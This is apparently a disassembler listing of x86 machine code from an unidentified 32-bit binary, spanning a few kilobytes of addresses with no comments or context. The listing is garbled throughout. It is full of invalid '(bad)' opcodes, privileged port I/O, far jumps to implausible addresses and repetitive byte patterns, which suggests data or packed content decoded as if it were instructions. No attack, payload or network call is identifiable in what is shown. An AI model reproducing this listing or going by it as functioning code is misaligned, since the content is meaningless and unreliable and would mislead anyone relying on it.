  4108e0:	mov    bh,0xff
  4108e3:	or     al,0xcd
  4108e5:	call   0x1716c45
  4108ea:	lfs    esp,FWORD PTR [eax+0x30a24ea4]
  4108f1:	and    dh,BYTE PTR [ebx+0x4844600]
  4108f7:	add    BYTE PTR [edx+0x33],ah
  4108fa:	cmp    BYTE PTR [esi-0x23],dl
  4108fd:	lods   al,BYTE PTR ds:[esi]
  4108fe:	call   0x1716c5e
  410903:	call   DWORD PTR [esi]
  410905:	sbb    eax,0x306200bd
  41090a:	mov    ah,0x8a
  41090c:	test   eax,0xb5d1e0d8
  410911:	aas    
  410912:	mov    BYTE PTR [edi-0xa3542a3],bh
  410918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410919:	das    
  41091a:	pop    edi
  41091b:	sbb    bl,BYTE PTR [esi+0x39e82217]
  410921:	xor    DWORD PTR [ecx],eax
  410923:	add    cl,bl
  410925:	mov    esp,0x30635be5
  41092a:	add    DWORD PTR [edi],ecx
  41092c:	mov    ah,0xed
  41092e:	add    eax,DWORD PTR [eax+0x12]
  410931:	fldenv [esi-0x175abea9]
  410937:	add    esp,DWORD PTR [edx-0x2a]
  41093a:	pop    ebp
  41093b:	enter  0x475d,0x53
  41093f:	out    0xb9,eax
  410941:	fsub   st,st(7)
  410943:	add    ebx,DWORD PTR [ebp-0x71]
  410946:	addr16 mov ds:0x9994,eax
  41094a:	out    0x22,eax
  41094c:	icebp  
  41094d:	cld    
  41094e:	or     eax,DWORD PTR ds:0x48ead962
  410954:	xchg   esp,eax
  410955:	inc    esi
  410956:	xchg   ebx,eax
  410957:	out    0x0,eax
  410959:	mov    eax,ebx
  41095b:	out    0x3,eax
  41095d:	popa   
  41095e:	sub    DWORD PTR [esi+0x57],ecx
  410961:	inc    ecx
  410962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410963:	call   0x72e96b6b
  410968:	dec    esi
  410969:	std    
  41096a:	cmp    bl,BYTE PTR [eax]
  41096c:	and    bh,ah
  41096e:	pop    ebx
  41096f:	daa    
  410970:	adc    bl,dh
  410972:	int    0xe8
  410974:	add    esp,DWORD PTR [edx+0x30]
  410977:	(bad)  
  410979:	in     al,0x45
  41097b:	bound  eax,QWORD PTR [edi+0x3e8a581]
  410981:	bound  ebx,QWORD PTR [ecx-0x2eedd69]
  410987:	fwait
  410988:	add    al,0x62
  41098a:	(bad)  
  41098c:	pop    ecx
  41098d:	es fldz 
  410990:	push   esi
  410991:	and    DWORD PTR [ebp-0x299dfc18],0x96057495
  41099b:	daa    
  41099c:	add    al,0x9d
  41099e:	mov    WORD PTR [ebx],es
  4109a0:	shl    BYTE PTR [edx-0x27],0xe7
  4109a4:	add    al,0xb7
  4109a6:	lods   eax,DWORD PTR ds:[esi]
  4109a7:	mov    esi,0xa54158
  4109ac:	call   0x763ee312
  4109b1:	mov    ah,BYTE PTR [ecx-0x579e1701]
  4109b7:	mov    DWORD PTR [edx-0x693094ca],esi
  4109bd:	add    BYTE PTR [ebx-0x23213fa3],al
  4109c3:	data16 xrelease xchg BYTE PTR [ebx-0x3c06a2af],al
  4109cb:	loopne 0x4109c9
  4109cd:	jbe    0x410952
  4109cf:	xor    DWORD PTR [ebp-0x76269e17],ebp
  4109d5:	ins    DWORD PTR es:[edi],dx
  4109d6:	cmp    ah,BYTE PTR [ecx-0x2b9e1701]
  4109dc:	mov    dh,0xbc
  4109de:	pusha  
  4109df:	cdq    
  4109e0:	push   eax
  4109e1:	dec    esi
  4109e2:	mov    edx,0x61e85cf8
  4109e7:	(bad)  ds:0xfe451d77
  4109ed:	jge    0x4109f9
  4109ef:	mov    eax,ds:0xd461e8ff
  4109f4:	mov    dh,0x69
  4109f6:	(bad)  
  4109f7:	xchg   ebx,eax
  4109f8:	inc    eax
  4109f9:	jmp    0xb5659240
  4109fe:	pusha  
  4109ff:	fld    DWORD PTR [eax]
  410a01:	jmp    0xa0ba:0x3dfdab1c
  410a08:	(bad)  
  410a09:	call   0xf711e26f
  410a0e:	adc    eax,0x61e85cf8
  410a13:	(bad)  [edi+0x72]
  410a16:	push   ds
  410a17:	cmp    al,0x36
  410a19:	mov    eax,0xa9834382
  410a1e:	jb     0x410a7e
  410a20:	aas    
  410a21:	aam    0x0
  410a23:	inc    edx
  410a24:	inc    ebx
  410a25:	mov    eax,DWORD PTR [eax]
  410a27:	fild   DWORD PTR ds:[edi+0x1ca54b47]
  410a2e:	cld    
  410a2f:	mov    ah,0xf9
  410a31:	call   0xff3ab867
  410a36:	mov    edi,edi
  410a38:	cmp    ebx,DWORD PTR [ecx+0x1]
  410a3b:	jnp    0x410a15
  410a3d:	inc    eax
  410a3e:	push   eax
  410a3f:	hlt    
  410a40:	stos   DWORD PTR es:[edi],eax
  410a41:	and    DWORD PTR [edx+ecx*2-0x28],ebx
  410a45:	add    BYTE PTR [edi],cl
  410a47:	lea    ebx,[ebx]
  410a49:	std    
  410a4a:	dec    BYTE PTR [edi+0x4b01593c]
  410a50:	fmul   DWORD PTR ds:0x4e789bb6
  410a56:	inc    eax
  410a57:	cmp    edi,ecx
  410a59:	mov    cl,0x24
  410a5b:	out    0xd6,eax
  410a5d:	add    BYTE PTR [eax],al
  410a5f:	or     BYTE PTR [ebx],cl
  410a61:	push   edi
  410a62:	(bad)  
  410a63:	out    dx,eax
  410a64:	cmp    ebx,DWORD PTR [ecx+0x1]
  410a67:	sti    
  410a68:	xlat   BYTE PTR ds:[ebx]
  410a69:	std    
  410a6a:	mov    ah,0x5f
  410a6c:	sbb    DWORD PTR [eax],eax
  410a6e:	add    BYTE PTR [ebx],cl
  410a70:	xchg   DWORD PTR [edx-0x31fb5c35],ecx
  410a76:	inc    DWORD PTR [ebx+ebx*2-0x43]
  410a7a:	movd   ecx,mm6
  410a7d:	icebp  
  410a7e:	push   DWORD PTR [edx+edi*4+0x1b]
  410a82:	cld    
  410a83:	fs stc 
  410a85:	mov    al,BYTE PTR [eax+eax*1+0x1b9f]
  410a8c:	mov    ebx,0xcb9c864e
  410a91:	xlat   BYTE PTR ds:[ebx]
  410a92:	add    BYTE PTR [ebx-0xb341083],cl
  410a98:	(bad)
  410a9c:	pop    edi
  410a9d:	sbb    DWORD PTR [eax],eax
  410a9f:	add    BYTE PTR [edx+0x32],ah
  410aa2:	push   cs
  410aa3:	mov    dh,0x2f
  410aa5:	xor    ecx,eax
  410aa7:	dec    edi
  410aa8:	(bad)  
  410aa9:	(bad)
  410aac:	arpl   WORD PTR [edx],si
  410aae:	add    DWORD PTR [edi],ecx
  410ab0:	mov    ah,0xf4
  410ab2:	add    al,0xff
  410ab4:	scas   al,BYTE PTR es:[edi]
  410ab5:	ffree  st(0)
  410ab7:	add    BYTE PTR [edx+0x32],ah
  410aba:	push   cs
  410abb:	mov    dh,0xe2
  410abd:	ror    ebp,1
  410abf:	aas    
  410ac0:	bound  ebp,QWORD PTR [ebx+0x58]
  410ac3:	and    esi,DWORD PTR [esi+0x61000131]
  410ac9:	jne    0x410a80
  410acb:	dec    BYTE PTR [esi]
  410acd:	sbb    eax,0x306200bd
  410ad2:	add    dl,al
  410ad4:	xor    eax,0x635be90d
  410ad9:	xor    BYTE PTR [ecx],al
  410adb:	push   ecx
  410adc:	fld    DWORD PTR [edi]
  410ade:	sub    eax,0x1dac3272
  410ae3:	test   BYTE PTR [edx],ah
  410ae5:	and    al,0x88
  410ae7:	jge    0x410aff
  410ae9:	pushf  
  410aea:	sbb    eax,0xdc9e00c6
  410aef:	fcomp  DWORD PTR ds:0x8c1e0bfe
  410af5:	lahf   
  410af6:	mov    WORD PTR cs:[esi+0x130ce],es
  410afd:	fnstcw WORD PTR [ebp+eiz*8+0x33]
  410b01:	retf   
  410b02:	push   esp
  410b03:	adc    eax,0x5323d5fe
  410b08:	push   esp
  410b09:	arpl   WORD PTR [ebx+0x53],cx
  410b0c:	inc    esp
  410b0d:	pusha  
  410b0e:	icebp  
  410b0f:	and    al,BYTE PTR [edi]
  410b11:	imul   esp,eax,0xb93e5701
  410b17:	mov    eax,0x22d97623
  410b1c:	mov    bh,0x41
  410b1e:	int3   
  410b1f:	in     eax,0x8c
  410b21:	adc    ebp,edi
  410b23:	sub    ebp,DWORD PTR [ebx]
  410b25:	jb     0x410af9
  410b27:	xchg   ebp,eax
  410b28:	leave  
  410b29:	pusha  
  410b2a:	sar    BYTE PTR [ebp-0x3f],cl
  410b2d:	popa   
  410b2e:	sbb    al,cl
  410b30:	or     ebp,DWORD PTR [ecx+0x11]
  410b33:	pusha  
  410b34:	iret   
  410b35:	inc    ecx
  410b36:	popf   
  410b37:	bound  eax,QWORD PTR [esi+0x3e7d9d1]
  410b3d:	fistp  DWORD PTR [ebp-0x63113c3d]
  410b43:	retf   
  410b44:	ret    
  410b45:	jmp    0x74d9:0x62037359
  410b4c:	enter  0x5060,0x23
  410b50:	call   0x2e8fb055
  410b55:	hlt    
  410b56:	jmp    0x540:0xe0b3c39c
  410b5d:	lahf   
  410b5e:	push   esi
  410b5f:	push   esp
  410b60:	imul   esp,edi,0xffffffdd
  410b63:	fsub   st,st(7)
  410b65:	add    ebp,ebx
  410b67:	xchg   esp,eax
  410b68:	add    edx,eax
  410b6a:	clc    
  410b6b:	clc    
  410b6c:	jb     0x410bb9
  410b6e:	and    bh,BYTE PTR [eax]
  410b70:	jmp    0xcaee6193
  410b75:	(bad)  
  410b76:	cmc    
  410b77:	dec    esi
  410b78:	pop    ds
  410b79:	mov    WORD PTR [ecx+0x1a88b3fd],ds
  410b7f:	int3   
  410b80:	out    0xa9,al
  410b82:	fld    TBYTE PTR [edi]
  410b84:	or     dl,BYTE PTR [edx]
  410b86:	aam    0x41
  410b88:	(bad)  
  410b89:	mov    DWORD PTR [ecx+0x632328a9],0x6995fea9
  410b93:	test   al,0x0
  410b95:	imul   BYTE PTR [ebp+0x61a9169d]
  410b9b:	dec    esi
  410b9c:	test   BYTE PTR ds:0xe900d8ea,cl
  410ba2:	jmp    0x2495:0xe92924ad
  410ba9:	dec    ecx
  410baa:	fcom   DWORD PTR [eax+eax*1-0x7f31e596]
  410bb1:	rol    cl,0xde
  410bb4:	rol    BYTE PTR [ebx+0x0],0x60
  410bb8:	push   esi
  410bb9:	loopne 0x410b6a
  410bbb:	test   al,0xd6
  410bbd:	ret    0xea72
  410bc0:	cmc    
  410bc1:	pop    esp
  410bc2:	call   0x6083e528
  410bc7:	sub    bh,ch
  410bc9:	xor    al,0x60
  410bcb:	or     bh,ch
  410bcd:	adc    al,0x1b
  410bcf:	push   cs
  410bd0:	inc    eax
  410bd1:	mov    ah,0xc5
  410bd3:	std    
  410bd4:	fld    DWORD PTR [eax]
  410bd6:	jmp    0x6f009341
  410bdb:	mov    bh,ah
  410bdd:	pop    esp
  410bde:	call   0x974ee544
  410be3:	xchg   esi,eax
  410be4:	mov    al,ds:0xa861a94d
  410be9:	std    
  410bea:	xchg   ebp,eax
  410beb:	cli    
  410bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bed:	(bad)  
  410bee:	call   0x3f14e854
  410bf3:	call   0x89d9:0x61e85cfc
  410bfa:	and    cl,BYTE PTR [edi-0x74]
  410bfd:	and    al,0xc5
  410bff:	pusha  
  410c00:	fld    DWORD PTR [eax]
  410c02:	adc    DWORD PTR [edx],ebx
  410c04:	adc    ch,bh
  410c06:	push   ss
  410c07:	mov    bl,0x11
  410c09:	aas    
  410c0a:	pusha  
  410c0b:	call   0xe9b:0xa0002cfc
  410c12:	test   BYTE PTR ds:0xee0000d5,ah
  410c18:	inc    ebx
  410c19:	stc    
  410c1a:	inc    DWORD PTR [eax]
  410c1c:	mov    esp,0xbb9b84cd
  410c21:	fadd   QWORD PTR [eax]
  410c23:	test   ebx,ecx
  410c25:	push   0xe08d3d06
  410c2a:	(bad)  
  410c2b:	push   DWORD PTR [esi]
  410c2d:	pop    ss
  410c2e:	mov    WORD PTR [edi+edx*2+0x15],es
  410c32:	mov    BYTE PTR [edi+0xdc17],al
  410c38:	add    BYTE PTR [eax],bl
  410c3a:	and    DWORD PTR [eax-0x46],edx
  410c3d:	cld    
  410c3e:	dec    DWORD PTR [edi-0x44]
  410c41:	push   0x64fc5021
  410c46:	or     edi,edi
  410c48:	push   esi
  410c49:	adc    BYTE PTR [ebx],0x40
  410c4c:	cmp    ecx,ebp
  410c4e:	mov    dh,0x4d
  410c50:	cmp    cl,ch
  410c52:	mov    dh,0x45
  410c54:	dec    ecx
  410c55:	fwait
  410c56:	loopne 0x410c60
  410c58:	inc    eax
  410c59:	xchg   esp,eax
  410c5a:	add    ch,cl
  410c5c:	mov    eax,0xee8a0998
  410c61:	fild   DWORD PTR [eax+0x2e66d7f9]
  410c67:	mov    eax,edi
  410c69:	aaa    
  410c6a:	xor    DWORD PTR [ebx-0x16eec829],ecx
  410c70:	mov    edi,0x70fffedc
  410c75:	adc    BYTE PTR [ecx],ah
  410c77:	dec    esp
  410c78:	jle    0x410c42
  410c7a:	and    eax,eax
  410c7c:	sti    
  410c7d:	fild   DWORD PTR [eax]
  410c7f:	cmp    eax,DWORD PTR [eax]
  410c81:	xor    ebp,ecx
  410c83:	test   cl,ch
  410c85:	jns    0x410c64
  410c87:	(bad)  
  410c88:	jmp    DWORD PTR [edx+0x3d]
  410c8b:	mov    cl,0x62
  410c8d:	xor    cl,BYTE PTR es:[eax+0x2a267e43]
  410c94:	fnstenv [eax+0x1e8a193e]
  410c9a:	push   cs
  410c9b:	ror    DWORD PTR [edx-0x7732e9e2],0xdd
  410ca2:	mov    ebp,0xad620004
  410ca7:	and    BYTE PTR [ebx],0xa2
  410caa:	xor    DWORD PTR [ecx],eax
  410cac:	add    BYTE PTR [ecx+0x7a],cl
  410caf:	or     DWORD PTR [ecx+ebp*4+0x7dfe1914],eax
  410cb6:	and    al,0xb1
  410cb8:	bound  ebx,QWORD PTR [esi]
  410cba:	xor    ch,BYTE PTR [edi+ecx*8]
  410cbd:	outs   dx,DWORD PTR ds:[esi]
  410cbe:	outs   dx,BYTE PTR ds:[esi]
  410cbf:	sbb    DWORD PTR [edx-0x753ef1e2],ecx
  410cc5:	scas   al,BYTE PTR es:[edi]
  410cc6:	adc    al,0xc5
  410cc8:	mov    ch,bl
  410cca:	mov    esp,0x9d620004
  410ccf:	and    BYTE PTR [ebx],0x22
  410cd2:	xor    DWORD PTR [ecx],eax
  410cd4:	add    BYTE PTR [ecx-0x78],bh
  410cd7:	nop
  410cd8:	add    eax,0x62b11e35
  410cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cde:	xor    dh,dl
  410ce0:	mov    edi,0xe90420d7
  410ce5:	add    ch,al
  410ce7:	popf   
  410ce8:	sbb    esi,edi
  410cea:	mov    BYTE PTR [ebx-0x6fef7fd5],ch
  410cf0:	sbb    DWORD PTR [ecx-0x7],ebp
  410cf3:	test   eax,0xfffdf19e
  410cf8:	in     al,dx
  410cf9:	iret   
  410cfa:	mov    ds:0xa2d6aa30,al
  410cff:	xor    BYTE PTR [edi-0x18265d2a],dl
  410d05:	mov    ?,WORD PTR [ecx+ebx*4-0x6652de19]
  410d0c:	out    0xe3,eax
  410d0e:	stos   DWORD PTR es:[edi],eax
  410d0f:	cdq    
  410d10:	out    0xd0,eax
  410d12:	stos   DWORD PTR es:[edi],eax
  410d13:	cdq    
  410d14:	out    0xb3,eax
  410d16:	fwait
  410d17:	cdq    
  410d18:	out    0xa2,eax
  410d1a:	fwait
  410d1b:	cdq    
  410d1c:	out    0x9e,eax
  410d1e:	mov    ebx,DWORD PTR [ecx-0x66748c19]
  410d24:	out    0xaa,eax
  410d26:	mov    edx,0xba75e799
  410d2b:	cdq    
  410d2c:	out    0x12,eax
  410d2e:	stos   BYTE PTR es:[edi],al
  410d2f:	cdq    
  410d30:	out    0x61,eax
  410d32:	stos   DWORD PTR es:[edi],eax
  410d33:	cdq    
  410d34:	out    0xa,eax
  410d36:	cdq    
  410d37:	cdq    
  410d38:	out    0x8e,eax
  410d3a:	cwde   
  410d3b:	cdq    
  410d3c:	out    0xff,eax
  410d3e:	mov    DWORD PTR [ecx-0x66763319],ebx
  410d44:	out    0x90,eax
  410d46:	xor    eax,0xa2e799
  410d4b:	sub    eax,0x1d9ee799
  410d50:	cdq    
  410d51:	out    0x2e,eax
  410d53:	das    
  410d54:	cdq    
  410d55:	out    0x71,eax
  410d57:	adc    al,0x99
  410d59:	out    0x11,eax
  410d5b:	pop    ss
  410d5c:	cdq    
  410d5d:	out    0xf2,eax
  410d5f:	or     al,0x99
  410d61:	out    0xd3,eax
  410d63:	inc    ebx
  410d64:	cdq    
  410d65:	out    0x66,eax
  410d67:	cmp    al,0x99
  410d69:	out    0xa6,eax
  410d6b:	xor    al,0x99
  410d6d:	out    0xcb,eax
  410d6f:	sub    al,0x99
  410d71:	out    0x85,eax
  410d73:	and    al,0x99
  410d75:	out    0x76,eax
  410d77:	sbb    al,0x99
  410d79:	out    0x7d,eax
  410d7b:	adc    al,0x99
  410d7d:	add    cl,ch
  410d7f:	mov    ch,0x1e
  410d81:	inc    eax
  410d82:	jmp    0xe98145d6
  410d87:	pop    edi
  410d88:	cmp    BYTE PTR [eax-0x17],al
  410d8b:	jecxz  0x410dc4
  410d8d:	inc    eax
  410d8e:	jmp    0xe98145c1
  410d93:	pop    ss
  410d94:	cmp    BYTE PTR [eax-0x17],al
  410d97:	jbe    0x410dd1
  410d99:	inc    eax
  410d9a:	jmp    0xe9814616
  410d9f:	bound  esi,QWORD PTR [edi]
  410da1:	inc    eax
  410da2:	jmp    0xe98142e3
  410da7:	out    0x34,al
  410da9:	inc    eax
  410daa:	jmp    0xe9814304
  410daf:	add    BYTE PTR [esi*1+0x354de940],bh
  410db6:	inc    eax
  410db7:	jmp    0xe98142fe
  410dbc:	inc    edx
  410dbd:	sbb    eax,0x21d9e940
  410dc2:	inc    eax
  410dc3:	jmp    0xe9814dad
  410dc8:	inc    ebp
  410dc9:	sub    eax,DWORD PTR [eax-0x17]
  410dcc:	and    ebp,DWORD PTR [ecx]
  410dce:	inc    eax
  410dcf:	jmp    0xe981340e
  410dd4:	mov    ch,0xc
  410dd6:	inc    eax
  410dd7:	jmp    0xe98137cd
  410ddc:	addr16 daa 
  410dde:	inc    eax
  410ddf:	jmp    0xe981364a
  410de4:	pop    edx
  410de5:	sub    eax,DWORD PTR [eax-0x17]
  410de8:	ja     0x410e17
  410dea:	inc    eax
  410deb:	jmp    0xe9811dd1
  410df0:	shr    DWORD PTR [eax],0x40
  410df3:	jmp    0x81368d
  410df8:	or     esp,DWORD PTR [esi-0xa]
  410dfb:	inc    eax
  410dfc:	or     ecx,DWORD PTR [edx-0x5204bf0b]
  410e02:	cmc    
  410e03:	inc    eax
  410e04:	sti    
  410e05:	fdiv   st,st(7)
  410e07:	inc    eax
  410e08:	retf   
  410e09:	mov    eax,edi
  410e0b:	inc    eax
  410e0c:	retf   
  410e0d:	test   eax,0x3ebb40f8
  410e12:	test   DWORD PTR [eax+0x0],0x40f8d5bb
  410e19:	retf   
  410e1a:	(bad)  
  410e1c:	inc    eax
  410e1d:	retf   
  410e1e:	(bad)  
  410e1f:	into   
  410e20:	inc    eax
  410e21:	mov    ebx,0xbb40d42c
  410e26:	cmp    ecx,0xffd88b40
  410e2c:	add    DWORD PTR [eax+0x7d05013c],ecx
  410e32:	(bad)  [eax]
  410e34:	or     DWORD PTR [ecx+0x310d0ccd],eax
  410e3a:	or     ecx,DWORD PTR [ebx]
  410e3c:	setnp  BYTE PTR [edi+0xf]
  410e40:	dec    edx
  410e41:	mov    BYTE PTR [esp+edx*1],ch
  410e44:	push   ss
  410e45:	mov    WORD PTR [eax+0x18],es
  410e48:	sbb    ah,BYTE PTR [eax+0x3e]
  410e4b:	sbb    bl,BYTE PTR [ebx]
  410e4d:	pusha  
  410e4e:	sbb    DWORD PTR ds:[esi+edx*2],ebx
  410e52:	inc    edx
  410e53:	push   ds
  410e54:	and    BYTE PTR [edx],bl
  410e56:	ss pop ds
  410e58:	and    ch,BYTE PTR [ecx]
  410e5a:	ss pop ds
  410e5c:	and    ebp,DWORD PTR [eax]
  410e5e:	sbb    al,0x24
  410e60:	es sbb al,0x30
  410e63:	sub    BYTE PTR [ecx],ch
  410e65:	and    ch,BYTE PTR [edi]
  410e67:	sub    BYTE PTR [ecx],ch
  410e69:	jno    0x410e96
  410e6b:	sub    ch,BYTE PTR [esi+eiz*2]
  410e6e:	das    
  410e6f:	cs dec edx
  410e71:	bound  edi,QWORD PTR [eax-0x35]
  410e74:	dec    ecx
  410e75:	cwde   
  410e76:	js     0x410e43
  410e78:	dec    ecx
  410e79:	add    BYTE PTR [edx],dh
  410e7b:	inc    edx
  410e7c:	retf   
  410e7d:	xor    BYTE PTR [eax],dh
  410e7f:	aas    
  410e80:	int    0x34
  410e82:	aaa    
  410e83:	cmp    eax,0x432c36cf
  410e88:	fnstcw WORD PTR [eax]
  410e8a:	cwde   
  410e8b:	aaa    
  410e8c:	aad    0x39
  410e8e:	cdq    
  410e8f:	push   ds
  410e90:	retf   
  410e91:	dec    ecx
  410e92:	sbb    BYTE PTR [eax-0x35],bh
  410e95:	cmp    al,0x84
  410e97:	or     eax,ecx
  410e99:	inc    eax
  410e9a:	and    BYTE PTR [edi-0x43],ch
  410e9d:	inc    esp
  410e9e:	sbb    al,0x73
  410ea0:	add    DWORD PTR [eax+0x1b],ecx
  410ea3:	mov    ds:0x3222e7a3,al
  410ea8:	ja     0x410e91
  410eaa:	and    dh,BYTE PTR [edx]
  410eac:	aaa    
  410ead:	out    0x22,eax
  410eaf:	xor    dh,ch
  410eb1:	call   0xe8fb40d8
  410eb6:	and    dh,BYTE PTR [edx]
  410eb8:	jno    0x410ea2
  410eba:	and    dh,BYTE PTR [edx]
  410ebc:	scas   al,BYTE PTR es:[edi]
  410ebd:	in     eax,0x22
  410ebf:	xor    al,BYTE PTR [ebx-0x1b]
  410ec2:	and    dh,BYTE PTR [edx]
  410ec4:	inc    ebx
  410ec5:	in     eax,0x22
  410ec7:	xor    bh,BYTE PTR [esi-0x41cf5d0d]
  410ecd:	repz mov ds:0xa2e51f30,al
  410ed3:	xor    BYTE PTR [ebx+0x7430a2e6],bh
  410ed9:	out    0xa2,al
  410edb:	xor    BYTE PTR ds:0x30a200e6,ch
  410ee1:	cli    
  410ee2:	out    0xa2,eax
  410ee4:	xor    BYTE PTR [ecx+0x7b30a2eb],ah
  410eea:	jmp    0x410e8e
  410eec:	(bad)  
  410eee:	or     DWORD PTR [bp+si+0x31e7],ebx
  410ef3:	stc    
  410ef4:	cdq    
  410ef5:	out    0x1b,eax
  410ef7:	stc    
  410ef8:	cdq    
  410ef9:	out    0xf9,eax
  410efb:	push   cs
  410efc:	call   0x1fe7:0x9a0bcce7
  410f03:	sti    
  410f04:	cdq    
  410f05:	out    0x1f,eax
  410f07:	sti    
  410f08:	cdq    
  410f09:	out    0xbe,eax
  410f0b:	rcr    DWORD PTR [ecx-0x662e4119],1
  410f11:	out    0x16,eax
  410f13:	mov    ebx,0xb8b4e799
  410f18:	cdq    
  410f19:	out    0x8a,eax
  410f1b:	enter  0xe799,0x58
  410f1f:	enter  0xe799,0xc
  410f23:	mov    esi,0xae80e799
  410f28:	cdq    
  410f29:	out    0x74,eax
  410f2b:	xchg   esi,eax
  410f2c:	cdq    
  410f2d:	out    0x79,eax
  410f2f:	mov    ds,WORD PTR [ecx-0x6669a219]
  410f35:	out    0x66,eax
  410f37:	mov    ds,WORD PTR [ecx-0x6689a519]
  410f3d:	out    0x4b,eax
  410f3f:	outs   dx,BYTE PTR ds:[esi]
  410f40:	cdq    
  410f41:	out    0x4b,eax
  410f43:	add    BYTE PTR [esi-0x67],dh
  410f46:	out    0x4b,eax
  410f48:	outs   dx,BYTE PTR ds:[esi]
  410f49:	cdq    
  410f4a:	out    0xbe,eax
  410f4c:	push   ecx
  410f4d:	cdq    
  410f4e:	out    0xbe,eax
  410f50:	push   ecx
  410f51:	cdq    
  410f52:	out    0x21,eax
  410f54:	push   ecx
  410f55:	cdq    
  410f56:	out    0xe8,eax
  410f58:	dec    esi
  410f59:	cdq    
  410f5a:	out    0xbe,eax
  410f5c:	ss cdq 
  410f5e:	out    0xbc,eax
  410f60:	cs cdq 
  410f62:	out    0xa6,eax
  410f64:	ss cdq 
  410f66:	add    cl,ch
  410f68:	fisubr WORD PTR ds:0xd961e83c
  410f6e:	mov    DWORD PTR [ebp+0x35],ebp
  410f71:	cli    
  410f72:	(bad)  
  410f73:	call   0xdd55dd9
  410f78:	sbb    bl,cl
  410f7a:	add    cl,ch
  410f7c:	loopne 0x410f0b
  410f7e:	and    al,0xed
  410f80:	dec    esp
  410f81:	push   edi
  410f82:	dec    esp
  410f83:	add    eax,0xa5813b16
  410f88:	add    eax,0x129afdee
  410f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f8e:	mov    DWORD PTR [ebp-0x4b],ebx
  410f91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f92:	(bad)  
  410f93:	call   0xeb1b15f9
  410f98:	jno    0x410f3d
  410f9a:	mov    DWORD PTR [eax],edx
  410f9c:	jmp    0x5c51:0x7c72fd8b
  410fa3:	lds    edi,FWORD PTR [ecx+0xcd5c50]
  410fa9:	in     eax,0x50
  410fab:	pop    esp
  410fac:	lds    eax,FWORD PTR [ebp+0x7e0d5c50]
  410fb2:	push   eax
  410fb3:	dec    esp
  410fb4:	add    eax,0xd6c50b2
  410fb9:	xchg   BYTE PTR [edx-0x3e],al
  410fbc:	ds mov eax,0x773de2ca
  410fc2:	scas   eax,DWORD PTR es:[edi]
  410fc3:	sti    
  410fc4:	sar    dl,1
  410fc6:	rol    DWORD PTR [eax],1
  410fc8:	jmp    0x654e4ab1
  410fcd:	shl    al,0x0
  410fd0:	jmp    0x654e88a9
  410fd5:	enter  0xe0,0xe9
  410fd9:	fisub  DWORD PTR [esp+0x5]
  410fdd:	popa   
  410fde:	fld    DWORD PTR [eax]
  410fe0:	add    BYTE PTR [edx],ah
  410fe2:	mov    cl,0x21
  410fe4:	pusha  
  410fe5:	cmp    bl,ch
  410fe7:	add    BYTE PTR [ebp+0x43],dh
  410fea:	mov    eax,0x5bbc0fc8
  410fef:	add    eax,0xc8b80b00
  410ff4:	jns    0x410ffa
  410ff6:	xor    eax,0xffffffe9
  410ff9:	xor    ah,ch
  410ffb:	add    BYTE PTR [eax],al
  410ffd:	sbb    al,0xa6
  410fff:	inc    esi
  411000:	sbb    BYTE PTR [eax],cl
  411002:	test   BYTE PTR [edx-0x7822a481],0x44
  411009:	push   edi
  41100a:	dec    ebp
  41100b:	push   cs
  41100c:	mov    bh,0x0
  41100e:	add    al,0x31
  411010:	mov    BYTE PTR [edi+eiz*4-0x7c],al
  411014:	push   cs
  411015:	mov    bh,0x4
  411017:	xor    ecx,DWORD PTR [eax-0x2036864]
  41101d:	dec    ebx
  41101f:	xchg   ecx,eax
  411020:	add    eax,0xddd0b78
  411025:	inc    ebp
  411026:	int3   
  411027:	cmp    al,0x80
  411029:	aas    
  41102a:	imul   BYTE PTR [edx+0x42]
  41102d:	push   eax
  41102e:	add    bl,BYTE PTR [ecx]
  411030:	and    DWORD PTR [ebx+eax*8+0x1c],ebp
  411034:	aas    
  411035:	(bad)  
  411037:	arpl   WORD PTR [ecx+0x24],ax
  41103a:	aas    
  41103b:	fs inc ecx
  41103d:	and    al,0x3b
  41103f:	fs pop ecx
  411041:	and    al,0x9b
  411043:	push   0x18078d2d
  411048:	sbb    DWORD PTR [ecx],eax
  41104a:	jnp    0x411028
  41104c:	push   eax
  41104d:	push   0x4b
  41104f:	pop    edi
  411050:	xchg   ecx,eax
  411051:	and    al,0xff
  411053:	fild   DWORD PTR [eax]
  411055:	add    al,dl
  411057:	popf   
  411058:	in     eax,0x6d
  41105a:	bound  edi,QWORD PTR [esi]
  41105c:	add    al,BYTE PTR [eax]
  41105e:	jmp    0x7eac9abc
  411063:	cmp    bh,BYTE PTR [esi-0x14]
  411066:	mov    bh,0x3f
  411068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411069:	sti    
  41106a:	cmp    edi,DWORD PTR [ecx]
  41106c:	or     DWORD PTR [eax],eax
  41106e:	bound  edi,QWORD PTR [ebx-0x49ffdc93]
  411074:	inc    ecx
  411075:	add    DWORD PTR [eax],eax
  411077:	fld    DWORD PTR [ecx+ecx*1+0x3f3b238b]
  41107e:	ror    BYTE PTR [edx],0x3e
  411081:	sbb    bh,0x63
  411084:	test   eax,0x473223bd
  411089:	dec    esp
  41108a:	inc    esp
  41108b:	push   esi
  41108c:	add    DWORD PTR [edx],ebp
  41108e:	add    ah,cl
  411090:	mov    eax,ds:0x25de8902
  411095:	and    eax,0x441cdff
  41109a:	mov    bh,0x1f
  41109c:	sub    al,0x42
  41109e:	call   0x63d3f3
  4110a3:	jmp    0x411112
  4110a5:	fnsave [edi]
  4110a7:	pop    ebp
  4110a8:	out    dx,eax
  4110a9:	(bad)  
  4110aa:	sbb    edx,DWORD PTR [ebp-0x61]
  4110ad:	dec    ecx
  4110ae:	push   cs
  4110af:	aad    0x7c
  4110b1:	stc    
  4110b2:	add    ah,BYTE PTR [ebp-0x1977bbbe]
  4110b8:	frstor [eax-0x1]
  4110bb:	test   DWORD PTR [ecx+0x7e],eax
  4110be:	add    DWORD PTR [esi-0x16],0x3
  4110c2:	add    BYTE PTR [edx-0x55],ah
  4110c5:	and    BYTE PTR [ebx],0x12
  4110c8:	inc    ecx
  4110c9:	add    DWORD PTR [eax],eax
  4110cb:	fcmovnb st,st(5)
  4110cd:	call   0x18173a1
  4110d2:	mov    ebx,esi
  4110d4:	fxch   st(3)
  4110d6:	mov    bh,0x0
